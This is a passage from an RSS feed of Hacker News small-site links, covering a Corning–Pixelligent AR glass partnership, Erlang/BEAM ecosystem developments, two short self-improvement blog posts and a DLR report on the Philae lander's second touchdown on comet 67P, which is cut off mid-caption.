<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24926021">thread link</a>) | @vrfinal
<br/>
October 28, 2020 | https://www.vrfinal.com/corning-inc-announces-pixelligent-tech-partnership/ | <a href="https://web.archive.org/web/*/https://www.vrfinal.com/corning-inc-announces-pixelligent-tech-partnership/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Corning Incorporated, the creators of the damage resistant "Gorilla Glass," have today announced a "strategic agreement" with Pixelligent Technologies - the world-leading supplier of compound materials.</p><p>Corning Incorporated is one of the world's biggest manufacturers of optical materials - providing high-refractive index glass which has enabled augmented and mixed reality headset manufacturers to deliver ever-greater AR image quality.</p><figure><img src="https://www.vrfinal.com/content/images/2020/10/https___specials-images.forbesimg.com_imageserve_499670178_0x0.jpg" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/10/https___specials-images.forbesimg.com_imageserve_499670178_0x0.jpg 600w, https://www.vrfinal.com/content/images/size/w1000/2020/10/https___specials-images.forbesimg.com_imageserve_499670178_0x0.jpg 1000w, https://www.vrfinal.com/content/images/2020/10/https___specials-images.forbesimg.com_imageserve_499670178_0x0.jpg 1199w" sizes="(min-width: 720px) 720px"><figcaption>The company announced a "strategic partnership" with Pixelligent, looking to move forward it's AR plans. (Credit: Corning)</figcaption></figure><p>The partnership is said to centred around Pixelligent's optically transparent compounds and Corning's glass manufacturing technology. But what will each company be bringing to the table? And what do they hope to achieve?</p><p>Well, Pixelligent are providing their PixClear polymers. These materials harness zirconia and titania-based nanocrystals in order to increase the refractive index of the optics they produce. Their optically transparent polymers will be central to Corning's plans for Next Gen optics.</p><p>Meanwhile, Corning already have vast experience producing flat, high-index glass wafers for a number of leading AR device manufactures. Some big names have been banking on the <em>Gorilla Glass </em>maker, considering that tech giant <em>Apple</em> have invested upwards of $450 million into the company since 2017.</p><p>A statement from Corning claims the partnership aims to "help reduce product-development time and expand availability of AR devices."</p><p>I must say, a collaboration between Pixelligent's <em>PixClear </em>and Corning's <em>Gorilla Glass </em>would certainly be a sight to behold for all you fans of advanced manufacturing materials!</p><figure><img src="https://www.vrfinal.com/content/images/2020/10/apple-store-green-leaf-9787-1.jpg" alt="" srcset="https://www.vrfinal.com/content/images/size/w600/2020/10/apple-store-green-leaf-9787-1.jpg 600w, https://www.vrfinal.com/content/images/size/w1000/2020/10/apple-store-green-leaf-9787-1.jpg 1000w, https://www.vrfinal.com/content/images/2020/10/apple-store-green-leaf-9787-1.jpg 1600w" sizes="(min-width: 720px) 720px"><figcaption>What does this mean for the future? Well, we may now know one of Apple VR's key manufacturing components. (Credit: Apple)</figcaption></figure><p>But what does this industry development mean for the future of VR? Well, rumours have been circulating for some time that <a href="https://www.vrfinal.com/apples-iphone-12-pro-to-have-lidar-scanner-for-instant-ar-capabilities/">Apple is looking make it's mark on the AR space</a>, <a href="https://www.vrfinal.com/apples-new-patents-an-indication-of-entry-into-the-vr-and-ar-space/">perhaps even looking to produce it's own AR headset</a>. We may now know one of Apple VR's key manufacturing components.</p><p>It's not just Apple stepping up their game, too. <a href="https://www.vrfinal.com/huawei-announces-upgraded-vr-glass-with-6dof/">Huawei today announced an upgraded VR Glass with 6DoF!</a></p>
          </div></div>]]>
            </description>
            <link>https://www.vrfinal.com/corning-inc-announces-pixelligent-tech-partnership/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24926021</guid>
            <pubDate>Thu, 29 Oct 2020 01:13:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Beam Marches Forward]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24925973">thread link</a>) | @andrenth
<br/>
October 28, 2020 | https://underjord.io/the-beam-marches-forward.html | <a href="https://web.archive.org/web/*/https://underjord.io/the-beam-marches-forward.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <small>2020-10-26</small>
        <p>The BEAM is the virtual machine that Erlang and Elixir runs on. It is widely cited as a battle-tested piece of software though I don‚Äôt know in which wars it has seen action. It has definitely paid its dues in the telecom space as well as globally scaled projects such as Whatsapp and Discord. It is well suited to tackle soft-realtime distributed systems with heavy concurrency. It has been a good platform chugging along. And with a small team at Ericsson responsible for much of its continuing development it has been managed in a deeply pragmatic way. Erlang has always been a bit of a secret and silent success. Almost no-one uses it if you look at market shares. But among the ones that use it there seems to be a very positive consensus. And then Elixir came and caused a bit of a boom. I think the BEAM has benefited from Elixir and Elixir wouldn‚Äôt exist without the BEAM. With that bit of background I‚Äôd like to shine a light on some cool developments that I think makes the BEAM more interesting or even uniquely interesting in the future.</p>
<h2 id="the-jit-is-here-soon-otp-24">The JIT is here (soon, OTP 24)</h2>
<p>With OTP 24 landing sometime next year we are going to get the a JIT for the BEAM. Based on the project <a href="https://github.com/asmjit/asmjit">AsmJit</a> this will mean that some BEAM code will be translated to native instructions. It will not be the kind of warm-up-for-performance-gains JIT that I‚Äôve heard of in PyPy but rather significantly simpler. The goal of the project was to introduce a JIT that could give performance gains for some cases but would not cause any performance regressions. A pragmatic and laudable approach. Considering this made the Jason JSON-library (written in Elixir) beat the Jiffy JSON-library (written as a C NIF) in <strong>some</strong> tests I think this has the potential to obviate the need for some NIF implementations. Avoiding reaching out to the lower level code that is more capable but more dangerous is a good win.</p>
<p>Anyone running RabbitMQ should look forward to the update as measurements indicate 30-50% increased message throughput. Which is a nice thing to get for no code changes at all.</p>
<p>Pushing the performance of the BEAM closer to native is magnificent. To be clear the BEAM is already quite a good performer. I would put Erlang and Elixir at the abstraction level of languages like Python/Ruby/Node.js. Python and Ruby are poor performers. The Python ML stuff all goes into C++ or similar for performance. I‚Äôve worked a bunch with Python and the things I hear from the Ruby world makes them sound quite equivalent in performance. They are a bit slow and can only <a href="https://underjord.io/more-than-one-thing-at-a-time.html">do one thing at a time</a>. Node.js is a bit different. It can do multiple things at a time, if you append asterisks and squint. It does it largely the same way Python + Gevent does it. This approach is incredibly susceptible to CPU-bound work causing head-of-line blocking. It becomes the single most important consideration for building a performant application ‚Äúget to IO, don‚Äôt compute‚Äù. V8 that Node.js runs on is heavily optimized and fast for such a dynamic language. I think the BEAM provides a better approach that can deliver comparable results without as many footguns (opportunities for shooting yourself in the foot). But getting better at the raw crunching is a big gain with this JIT implementation and I look forward to the release.</p>
<h2 id="lumen---static-compilation--wasm">Lumen - Static compilation &amp; WASM</h2>
<p>The <a href="https://getlumen.org/">Lumen project</a> is a huge effort by a gang of open source developers and DockYard to implement a compiler (and more) that can take Elixir and Erlang into the browser. By solving that they end up solving static compilation for Erlang and Elixir as well. So this isn‚Äôt compiling and shipping the BEAM to the browser. This is a faithful reimplementation of the BEAM functionality in a way that allows it to be compiled statically. It uses LLVM and requires quite a bit of effort both in development and in wrangling the Web Assembly work group process stuff to make sure that the standard is not entirely run by Object-Oriented Programming needs.</p>
<p>I don‚Äôt think Lumen will replace the BEAM. The BEAM has a brilliant track record for long-running services and distributed computing that the Lumen project do not even attempt to achieve right now. Instead the Lumen project will allow Elixir and Erlang to move into spaces where the BEAM might be a bit too heavy and still provide the same guarantees. Typically I see it being good for command line tools, web frontends (super interesting to consider the Actor model going there), serverless/edge computing and potentially with WASM competing with Docker as a delivery mechanism for code in Kubernetes, using something like <a href="https://github.com/deislabs/krustlet">Krustlet</a> (<a href="https://player.fm/series/software-sessions/webassembly-on-the-server-with-krustlet">good podcast episode on WASM/Krustlet</a>). It‚Äôs probably Cloud Native or something. Who knows.</p>
<p>What gives Lumen the potential to be a better fit in these circumstances is that it can optimize for filesize (by cutting out hot code updates) and it is likely able to start much faster. Lumen is written in Rust. Which seems to be the popular choice around Web Assembly from what I‚Äôve seen. Lumen is still an early release project and not fit for production. But it is beeing actively pushed forward.</p>
<h2 id="nerves---an-iot-platform-with-minimal-suck">Nerves - An IoT platform with minimal suck</h2>
<p>The <a href="https://www.nerves-project.org/">Nerves project</a> is fantastic. I‚Äôm a hardware hobbyist, not an IoT dev but I‚Äôve worked a fair bit with Nerves and it is so, so good. What Nerves gives you when working with a Raspberry Pi for example is a way to let your code run all of the device. The BEAM is basically your operating system on top of a minimal Linux installation. The Linux you have is based on the solid foundation of Buildroot so it is quite feasible to modify it as you see fit. The big idea is that if you are running a Linux-level SBC already you might as well build on something that gives you the guarantees of the BEAM.</p>
<p>Beyond that the default setup encodes a lot of good embedded practices by default so that you avoid bricking devices with firmware updates, you get easy support for pushing firmware over the network or USB and much, much more.</p>
<p>There are a ton of good libraries for sensors and assorted hardware, as well as the common protocols like GPIO/SPI/I2C/UART. Networking support is well considered and has been reworked since I first started using Nerves a few years back (and it worked well then too). BLE is getting more and more good support recently.</p>
<p>The project also created <a href="https://www.nerves-project.org/nerveshub">NervesHub</a> which is a solution for managing a fleet of devices by securely providing firmware updates, allowing the switching on of a remote console on devices if that‚Äôs a need on your product. I think the most recent stuff is a UI revamp and some serious work on binary diffed patches to minimize firmware update sizes for data-constrained deployments.</p>
<p>This is very much a production project and people are shipping hardware with Nerves. It keeps marching forward.</p>
<h2 id="the-beam-can-be-your-entire-application">The BEAM can be your entire application</h2>
<p>Sa≈°a Juriƒá, author of the much-acclaimed Elixir in Action book has produced a library called <a href="https://github.com/sasa1977/site_encrypt">site_encrypt</a>. It allows you to handle LetsEncrypt configuration without a separate webserver or actually using certbot.</p>
<p>Now this library is good and meaningful in its own right but the underlying idea is why I bring it up. The BEAM can be your entire application. This is something I‚Äôve realized over time. Where in Python you would reach for Gunicorn to run you Django app and Nginx to protect Gunicorn from the big bad world.. The BEAM is made for this. Introducing an intermediate layer of Nginx (or another HTTP server) might actually be detrimental in that you now have two things you need to configure correctly and two pools of multi-core processing workers that care about this request/response cycle and can independently screw it up.</p>
<p>The BEAM was always built for this. OTP has a lot weird corners where you find interesting libraries such as <code>wx</code> for WxWidgets (window management) and <code>ssh</code> for both SSH client and server work I believe. Because it is meant to be delivered as a full solution. It can run and manage multiple different types of work inside of it. Gracefully. It doesn‚Äôt replace Kubernetes for the large deployment or polyglot environments. But it might very well mean you don‚Äôt actually need to go there early. Or you can reduce how much Ops you need in your Dev. If your entire stack is Elixir or Erlang front to back I think you have empowered your developers significantly.</p>
<p>There is already a move towards this where tools are converging that give us a lot of things out of the box that we‚Äôd otherwise need to move outside our application for. These are pragmatic 80-90% solutions. The normal solutions are still all there if you need to reach for them. But maybe you don‚Äôt. I see these as moves in the same vein:</p>
<ul>
<li>LiveView - We can reduce the amount of frontend we need to build that isn‚Äôt BEAM code (Elixir or Erlang), in some cases get rid of it entirely.</li>
<li>Live Dashboard - Application insights right in your application stack instead of pushing them out to another solution.</li>
<li>Phoenix PubSub - Distributed PubSub without requiring coordination via something like Redis.</li>
<li>Phoenix Channels - Distributed PubSub over WebSockets using the above PubSub to coordinate delivery.</li>
<li>Phoenix Presence - Distribute Presence. A CRDT-powered thing for maintaining information about if someone is connected to a channel or not, like chatrooms and online/offline. Using Channels.</li>
</ul>
<p>Lowering complexity by keeping the solutions in a system you understand well is potentially very powerful. At some point many projects will need to pick up external dependencies such as Nginx, Redis or whatever. But I think there is something compelling about building your application inside a system that can do all of it quite well. Elixir and Phoenix already have significant mind-share in the startup world. I wouldn‚Äôt be surprised if this ends up being a very popular solution for startups. No frontend-specific code for the MVP, no New Relic or Mixpanel bill we make do with the Live Dashboard. Distribution is Erlang distribution + Swarm/Horde/Libcluster or something ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://underjord.io/the-beam-marches-forward.html">https://underjord.io/the-beam-marches-forward.html</a></em></p>]]>
            </description>
            <link>https://underjord.io/the-beam-marches-forward.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24925973</guid>
            <pubDate>Thu, 29 Oct 2020 01:03:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When Trying More Leads You to Achieve Less]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24925858">thread link</a>) | @victorbreder
<br/>
October 28, 2020 | https://breder.org/1/ | <a href="https://web.archive.org/web/*/https://breder.org/1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>2020-10-26</p>

<p>For some weeks now I've been fantasizing about creating this blog. I've thought about creating an HTTP server from scratch just to serve it on a Linode instance, writing a static blog engine to generate the HTML from Markdown, besides every other kinds of over-engineering just for fun.</p>

<p>I've also compiled a list with a dozen blogs I enjoy the most. Then I've tried to distill what are their qualities that makes me enjoy them, and how I may achieve those in my own blog.</p>

<p>Well, as you may see, this is my first post. Doing all of the above lead me to not start any blog at all.</p>

<p>This may be called "analysis paralysis", "over-engineering" or "perfect is the enemy of the good". Whatever it may be, I'm done with it now.</p>

<p>The most valuable thing is to produce something and put it out in the world. All the planning, engineering, thinking exists just to support that. With no realization, no "getting started", ultimately there's no value to be generated at all.</p>

<p>This is obvious in hindsight, but it's very easy to forget this lesson.</p>

<p>So, what have <em>you</em> been putting off through planning and fantasizing? What is keeping you from just <em>doing</em> what you want to do? Can't you get started right now or are you avoiding it by doing easier things? And by doing what you are doing, are you generating any value for yourself or for anyone?</p>

</div></div>]]>
            </description>
            <link>https://breder.org/1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24925858</guid>
            <pubDate>Thu, 29 Oct 2020 00:43:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Growth Mindset vs. Fixed Mindset: What Cognitive Psychology Tells Us]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24925855">thread link</a>) | @victorbreder
<br/>
October 28, 2020 | https://breder.org/2/ | <a href="https://web.archive.org/web/*/https://breder.org/2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>2020-10-26</p>

<p>The <em>Growth Mindset</em> research is one of the most impacting developments of cognitive psychology. Spearheaded by the decades of research of the psychologist Carol Dweck, it reveals how our <em>beliefs</em> about intelligence and skill shape our performance.</p>

<p>This research brilliantly sidesteps the long debate of "nature vs nurture", or how much are our intelligence, talent or skill brought up by our intrinsic genes or by our extrinsic environment and actions. The focus is on the <em>belief</em> itself that the individual holds.</p>

<p>Dweck has shown that individuals with a <em>Growth Mindset</em>, that believe that intelligence can be developed and skill is acquired through effortful practice, end up being more successful. This happens because such individuals tend to embrace challenges, push out of their zone of comfort and accept negative feedback.</p>

<p>On the other hand, individuals with a <em>Fixed Mindset</em>, that believe that intelligence is bestowed upon birth and not developed thereafter, end up being less successful. They tend to deal worse with setbacks, seeing failures as permanent testaments of their limitations. Because of this, they tend to avoid new situations and challenges above their level of skill. As a self-fulfilling prophecy, they end up not further developing their skills.</p>

<p>Dweck has also shown that we are strongly biased towards a Fixed Mindset, but with conscious effort it is possible to rewire ourselves to be more oriented towards a Growth Mindset. The psychologist has urged parents and teachers to instill in kids a Growth Mindset by praising the effort they put in instead of seemingly natural intelligence or talent.</p>

<p>The book <a href="https://www.amazon.com/gp/product/B000FCKPHG/">"Mindset: The New Psychology of Success"</a> is a great read and goes into details of how the Growth Mindset was studied and how one can become more growth-oriented.</p>

</div></div>]]>
            </description>
            <link>https://breder.org/2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24925855</guid>
            <pubDate>Thu, 29 Oct 2020 00:43:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[4.5-bil¬≠lion-year-old ice on comet 'fluffi¬≠er than cap¬≠puc¬≠ci¬≠no froth']]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24925843">thread link</a>) | @sohkamyung
<br/>
October 28, 2020 | https://www.dlr.de/content/en/articles/news/2020/04/20201028_4_5-billion-year-old-ice-on-comet-fluffier-than-cappuccino-froth.html | <a href="https://web.archive.org/web/*/https://www.dlr.de/content/en/articles/news/2020/04/20201028_4_5-billion-year-old-ice-on-comet-fluffier-than-cappuccino-froth.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
        <section>
    <div>
        
                                                                                    
                                                                                                                                                                    
                                                            
                    







	<div>
		<div>
		    <div>
		        <div>
		        	

<div>
	




<picture>
	<source srcset="https://www.dlr.de/content/en/images/2020/4/philae-s-path-on-comet-67p.jpg?__blob=normal&amp;v=2__ifc640w" media="(max-width: 640px)">
	<source srcset="https://www.dlr.de/content/en/images/2020/4/philae-s-path-on-comet-67p.jpg?__blob=normal&amp;v=2__ifc1024w" media="(max-width: 1024px)">
	<img src="https://www.dlr.de/content/en/images/2020/4/philae-s-path-on-comet-67p.jpg?__blob=normal&amp;v=2__ifc1920w" alt="Philae‚Äôs path on comet 67P">
</picture>
	
	<div>
		<p><span>Phi¬≠lae‚Äôs path on comet 67P</span></p>
		<p><span>Image</span>
		1/11,
		<span>Credit: </span>	





	
	
		ESA/Rosetta/MPS for OSIRIS Team MPS/UPD/LAM/IAA/SSO/INTA/UPM/DASP/IDA
	



	</p></div>
	<div>
		<div>
			<h3>Philae‚Äôs path on comet 67P</h3><p>
			The Phi¬≠lae re¬≠search mod¬≠ule sep¬≠a¬≠rat¬≠ed from ESA's Roset¬≠ta or¬≠biter on 12 Novem¬≠ber 2014 in or¬≠der to land on Comet 67P/Churyu¬≠mov-Gerasi¬≠menko. Af¬≠ter sev¬≠en hours of freefall, it touched the Ag¬≠ilkia land¬≠ing site (top left out¬≠side the im¬≠age) at walk¬≠ing pace as planned. How¬≠ev¬≠er, Phi¬≠lae could not an¬≠chor it¬≠self be¬≠cause the an¬≠chor har¬≠poons pro¬≠vid¬≠ed for this pur¬≠pose did not ac¬≠ti¬≠vate. Due to the low grav¬≠i¬≠ty, Phi¬≠lae bounced off the sur¬≠face, rose to a height of more than one kilo¬≠me¬≠tre, col¬≠lid¬≠ed with a cliff edge while falling, touched the comet's sur¬≠face a sec¬≠ond time (TD2) and fi¬≠nal¬≠ly came to a halt af¬≠ter two hours (TD3). The lo¬≠ca¬≠tion of TD2 was un¬≠known un¬≠til re¬≠cent¬≠ly and could on¬≠ly now be re¬≠con¬≠struct¬≠ed. Phi¬≠lae was lo¬≠cat¬≠ed in a place with suf¬≠fi¬≠cient sun¬≠light to pro¬≠duce enough en¬≠er¬≠gy to run its ten ex¬≠per¬≠i¬≠ments for ap¬≠prox¬≠i¬≠mate¬≠ly 60 hours.
			
				</p>
			
		</div>
	</div>
</div>



<div>
	
		
	




		
			
				
				
					
						
					






				
			
		

    <div>
    	<p><span>Phi¬≠lae's sec¬≠ond touch¬≠down site, be¬≠fore ar¬≠riv¬≠ing at its fi¬≠nal lo¬≠ca¬≠tion</span></p>
		<p><span>Video</span>
		2/11,
		<span>Credit: </span>
			





	
	
		Images: ESA/Rosetta/MPS for OSIRIS Team MPS/UPD/LAM/IAA/SSO/INTA/UPM/DASP/IDA; Analysis: O‚ÄôRourke et al (2020) 
	



	</p></div>

	
		<div>
			<div>
				<h3>Philae's second touchdown site, before arriving at its final location</h3>
				
					<p><strong>Credit: </strong>	





	
	
		Images: ESA/Rosetta/MPS for OSIRIS Team MPS/UPD/LAM/IAA/SSO/INTA/UPM/DASP/IDA; Analysis: O‚ÄôRourke et al (2020) 
	


</p>
				

				
					<p><strong>Length: </strong>00:00:28</p><p>
				
				Roset¬≠ta‚Äôs Phi¬≠lae lan¬≠der touched down on Comet 67P/Churyu¬≠mov-Gerasi¬≠menko on 12 Novem¬≠ber 2014 and made mul¬≠ti¬≠ple con¬≠tacts with the sur¬≠face be¬≠fore ar¬≠riv¬≠ing at its fi¬≠nal rest¬≠ing place. Its sec¬≠ond touch¬≠down site was re¬≠cent¬≠ly iden¬≠ti¬≠fied just 30 me¬≠tres away from its fi¬≠nal po¬≠si¬≠tion. This an¬≠i¬≠ma¬≠tion shows how Phi¬≠lae flew across the sur¬≠face to¬≠wards skull face, in¬≠ter¬≠act¬≠ing with the sur¬≠face ‚Äì as shown in the in¬≠sets ‚Äì be¬≠fore ar¬≠riv¬≠ing at its fi¬≠nal lo¬≠ca¬≠tion.
				</p>
			</div>
		</div>
	
</div>



<div>
	




<picture>
	<source srcset="https://www.dlr.de/content/en/images/2020/4/philaes-two-minutes-on-td2.gif?__blob=normal&amp;v=2__ifc640w" media="(max-width: 640px)">
	<source srcset="https://www.dlr.de/content/en/images/2020/4/philaes-two-minutes-on-td2.gif?__blob=normal&amp;v=2__ifc1024w" media="(max-width: 1024px)">
	<img src="https://www.dlr.de/content/en/images/2020/4/philaes-two-minutes-on-td2.gif?__blob=normal&amp;v=2__ifc1920w" alt="Philae‚Äôs two minutes on TD2 (Touchdown 2)">
</picture>
	
	<div>
		<p><span>Phi¬≠lae‚Äôs two min¬≠utes on TD2 (Touch¬≠down 2)</span></p>
		<p><span>Image</span>
		3/11,
		<span>Credit: </span>	





	
	
		 Images: ESA/Rosetta/MPS for OSIRIS Team MPS/UPD/LAM/IAA/SSO/INTA/UPM/DASP/IDA; Data: ESA/Rosetta/Philae/ROMAP; Analysis: O‚ÄôRourke et al (2020)
	



	</p></div>
	<div>
		<div>
			<h3>Philae‚Äôs two minutes on TD2 (Touchdown 2)</h3><p>
			An¬≠i¬≠ma¬≠tion show¬≠ing how Roset¬≠ta‚Äôs Phi¬≠lae lan¬≠der moved through touch¬≠down site two on Comet 67P/Churyu¬≠mov-Gerasi¬≠menko on 12 Novem¬≠ber 2014. Ini¬≠tial¬≠ly trav¬≠el¬≠ling in a down¬≠ward di¬≠rec¬≠tion, Phi¬≠lae slides down the edge of a boul¬≠der (1) and flips ver¬≠ti¬≠cal¬≠ly, ro¬≠tat¬≠ing like a wind¬≠mill to pass be¬≠tween two boul¬≠ders (2) ex¬≠pos¬≠ing lay¬≠ers of ice in the crevice walls with its feet. A dust wall was cre¬≠at¬≠ed by the wind¬≠mill ac¬≠tion, push¬≠ing through the dust that had heaped up be¬≠tween the boul¬≠ders up to that point in time. The crevice is about 2.5 m long and is curved with a width of 1‚Äì1.5 m, al¬≠low¬≠ing Phi¬≠lae to pass through. Phi¬≠lae then stamps a 25 cm im¬≠print of the top of the lan¬≠der in¬≠to the comet‚Äôs sur¬≠face (3) ‚Äì a hole made by the top of the SD2 (Sam¬≠pling, Drilling and Dis¬≠tri¬≠bu¬≠tion de¬≠vice) tow¬≠er that sticks up above the top of Phi¬≠lae can be recog¬≠nised. Phi¬≠lae then climbed out of the crevice, knock¬≠ing off ma¬≠te¬≠ri¬≠al from an over¬≠hang (4a) and was pushed down again with its top sur¬≠face, cre¬≠at¬≠ing an im¬≠pres¬≠sion in the dust cor¬≠re¬≠spond¬≠ing to the ‚Äòeye‚Äô of the fea¬≠ture that re¬≠sem¬≠bles a skull (4b).
			
				</p>
			
		</div>
	</div>
</div>


<div>
	




<picture>
	<source srcset="https://www.dlr.de/content/en/images/2020/4/comet-ice-in-the-shape-of-a-skull-on-67p.gif?__blob=normal&amp;v=3__ifc640w" media="(max-width: 640px)">
	<source srcset="https://www.dlr.de/content/en/images/2020/4/comet-ice-in-the-shape-of-a-skull-on-67p.gif?__blob=normal&amp;v=3__ifc1024w" media="(max-width: 1024px)">
	<img src="https://www.dlr.de/content/en/images/2020/4/comet-ice-in-the-shape-of-a-skull-on-67p.gif?__blob=normal&amp;v=3__ifc1920w" alt="Comet ice in the shape of a skull on 67P">
</picture>
	
	<div>
		<p><span>Comet ice in the shape of a skull on 67P</span></p>
		<p><span>Image</span>
		4/11,
		<span>Credit: </span>	





	
	
		ESA/Rosetta/MPS for OSIRIS Team MPS/UPD/LAM/IAA/SSO/INTA/UPM/DASP/IDA; O‚ÄôRourke et al (2020)
	



	</p></div>
	<div>
		<div>
			<h3>Comet ice in the shape of a skull on 67P</h3><p>
			Roset¬≠ta‚Äôs Phi¬≠lae lan¬≠der touched down on Comet 67P/Churyu¬≠mov-Gerasi¬≠menko on 12 Novem¬≠ber 2014 and made mul¬≠ti¬≠ple con¬≠tacts with the sur¬≠face be¬≠fore ar¬≠riv¬≠ing at its fi¬≠nal rest¬≠ing place. The comet to¬≠pog¬≠ra¬≠phy at Phi¬≠lae‚Äôs sec¬≠ond touch¬≠down site re¬≠sem¬≠bles the shape of a skull with a point¬≠ed ‚Äòhat‚Äô when viewed from above. This gif shows the fea¬≠ture that re¬≠sem¬≠bles a skull face, with Phi¬≠lae su¬≠per¬≠im¬≠posed for scale (Phi¬≠lae‚Äôs ‚Äòbody‚Äô mea¬≠sures about 1 m across, and each leg is 1.5 m long). Phi¬≠lae‚Äôs body com¬≠pressed in¬≠to the ice-dust scenery to cre¬≠ate the skull‚Äôs right eye. The dark re¬≠gion just above the skull‚Äôs right eye is the en¬≠trance to a gap be¬≠tween the two boul¬≠ders nick¬≠named ‚Äòskull-top ridge‚Äô, where Phi¬≠lae act¬≠ed like a wind¬≠mill to pass be¬≠tween them.
			
				</p>
			
		</div>
	</div>
</div>


<div>
	




<picture>
	<source srcset="https://www.dlr.de/content/en/images/2020/4/philae-s-contact-with-the-comet-put-into-regional-context.jpg?__blob=normal&amp;v=3__ifc640w" media="(max-width: 640px)">
	<source srcset="https://www.dlr.de/content/en/images/2020/4/philae-s-contact-with-the-comet-put-into-regional-context.jpg?__blob=normal&amp;v=3__ifc1024w" media="(max-width: 1024px)">
	<img src="https://www.dlr.de/content/en/images/2020/4/philae-s-contact-with-the-comet-put-into-regional-context.jpg?__blob=normal&amp;v=3__ifc1920w" alt="Philae‚Äôs contact with the comet put into regional context">
</picture>
	
	<div>
		<p><span>Phi¬≠lae‚Äôs con¬≠tact with the comet put in¬≠to re¬≠gion¬≠al con¬≠text</span></p>
		<p><span>Image</span>
		5/11,
		<span>Credit: </span>	





	
	
		Images: Touchdown 1: ESA/Rosetta/Philae/ROLIS/DLR; all other images: ESA/Rosetta/MPS for OSIRIS Team MPS/UPD/LAM/IAA/SSO/INTA/UPM/DASP/IDA; Analysis: O‚ÄôRourke et al (2020)
	



	</p></div>
	<div>
		<div>
			<h3>Philae‚Äôs contact with the comet put into regional context</h3><p>
			Phi¬≠lae‚Äôs flight across the sur¬≠face of Comet 67P/Churyu¬≠mov-Gerasi¬≠menko on 12 Novem¬≠ber 2014 saw the lan¬≠der strike the sur¬≠face in mul¬≠ti¬≠ple lo¬≠ca¬≠tions. This graph¬≠ic sum¬≠maris¬≠es the main touch¬≠down sites. At 15:35 UTC Phi¬≠lae made first con¬≠tact with the sur¬≠face at Ag¬≠ilkia ‚Äì the im¬≠age shown here was tak¬≠en by Phi¬≠lae‚Äôs own cam¬≠era, RO¬≠LIS, be¬≠fore touch¬≠down, ap¬≠prox¬≠i¬≠mate¬≠ly 40 me¬≠tres from the sur¬≠face. Phi¬≠lae then took flight across the Hat¬≠mehit de¬≠pres¬≠sion on the ‚Äòtop‚Äô of the small comet lobe, col¬≠lid¬≠ing with a cliff edge at 16:20 UTC. This set it on course with the sec¬≠ond touch¬≠down site, where it in¬≠ter¬≠act¬≠ed with the sur¬≠face mul¬≠ti¬≠ple times over a pe¬≠ri¬≠od of two min¬≠utes start¬≠ing at around 17:24 UTC. Phi¬≠lae ar¬≠rived at its fi¬≠nal rest¬≠ing place at Aby¬≠dos, about 30 m away, at 17:31 UTC. The im¬≠age has been en¬≠hanced to al¬≠low Phi¬≠lae, hid¬≠ing in the shad-ows just 30 me¬≠tres away from the sec¬≠ond touch¬≠down lo¬≠ca¬≠tion, to be seen.
			
				</p>
			
		</div>
	</div>
</div>


<div>
	




<picture>
	<source srcset="https://www.dlr.de/content/en/images/2020/4/philae-leaves-traces-at-contact-point-two.jpg?__blob=normal&amp;v=2__ifc640w" media="(max-width: 640px)">
	<source srcset="https://www.dlr.de/content/en/images/2020/4/philae-leaves-traces-at-contact-point-two.jpg?__blob=normal&amp;v=2__ifc1024w" media="(max-width: 1024px)">
	<img src="https://www.dlr.de/content/en/images/2020/4/philae-leaves-traces-at-contact-point-two.jpg?__blob=normal&amp;v=2__ifc1920w" alt="Philae leaves traces at contact point two">
</picture>
	
	<div>
		<p><span>Phi¬≠lae leaves traces at con¬≠tact point two</span></p>
		<p><span>Image</span>
		6/11,
		<span>Credit: </span>	





	
	
		Images: ESA/Rosetta/MPS for OSIRIS Team MPS/UPD/LAM/IAA/SSO/INTA/UPM/DASP/IDA; Daten: ESA/Rosetta/Philae/ROMAP; Analysis: O‚ÄôRourke et al. (2020)
	



	</p></div>
	<div>
		<div>
			<h3>Philae leaves traces at contact point two</h3><p>
